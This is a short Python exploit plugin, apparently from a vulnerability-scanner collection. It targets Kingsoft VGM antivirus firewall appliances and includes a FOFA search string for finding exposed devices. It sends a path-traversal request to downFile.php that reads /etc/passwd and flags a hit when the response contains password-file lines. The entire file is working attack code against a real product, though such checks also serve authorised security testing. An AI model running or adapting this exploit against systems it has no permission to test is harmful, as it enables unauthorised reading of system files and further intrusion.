#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/金山/金山 VGM防毒墙 downFile.php 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金山 VGM防毒墙 downFile.php 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '"金山VGM"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/downFile.php?filename=../../../../etc/passwd'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      ret['url'] = url1
      return ret
    else:
      return ret
  except:
    return ret